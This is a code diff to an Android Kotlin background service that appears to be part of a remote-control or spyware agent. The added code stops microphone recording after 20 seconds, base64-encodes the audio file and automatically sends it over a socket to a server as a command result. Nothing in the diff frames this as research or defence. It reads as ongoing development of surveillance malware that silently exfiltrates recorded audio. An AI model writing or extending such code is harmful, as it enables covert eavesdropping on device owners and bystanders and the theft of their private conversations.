@@ -563,6 +563,21 @@ class MainService : Service() {
                 prepare(); start()
             }
             isRecordingAudio = true
+            // Auto-stop after 20 seconds to limit file size
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (isRecordingAudio) {
+                    Log.d(TAG, "Auto-stopping recording after 20s")
+                    val result = stopAudioRecording()
+                    // Send result to server
+                    if (isConnected) {
+                        socket.emit("device:result", JSONObject().apply {
+                            put("commandId", "audio_auto_${System.currentTimeMillis()}")
+                            put("result", result)
+                            put("status", "executed")
+                        })
+                    }
+                }
+            }, 20000)
             return JSONObject().apply { put("success", true); put("file", file.absolutePath); put("duration", "started") }
         } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
@@ -572,7 +587,15 @@ class MainService : Service() {
         try {
             audioRecorder?.apply { stop(); release() }; audioRecorder = null; isRecordingAudio = false
             val audioData = if (currentAudioFile != null) File(currentAudioFile).readBytes() else null
-            return JSONObject().apply { put("success", true); put("file", currentAudioFile ?: ""); if (audioData != null) put("data", Base64.encodeToString(audioData, Base64.NO_WRAP)) }
+            val result = JSONObject()
+            result.put("command", "record_audio")
+            result.put("success", true)
+            result.put("file", currentAudioFile ?: "")
+            if (audioData != null) {
+                result.put("data", Base64.encodeToString(audioData, Base64.NO_WRAP))
+            }
+            currentAudioFile = null
+            return result
         } catch (e: Exception) { return JSONObject().apply { put("error", e.message) } }
     }
     
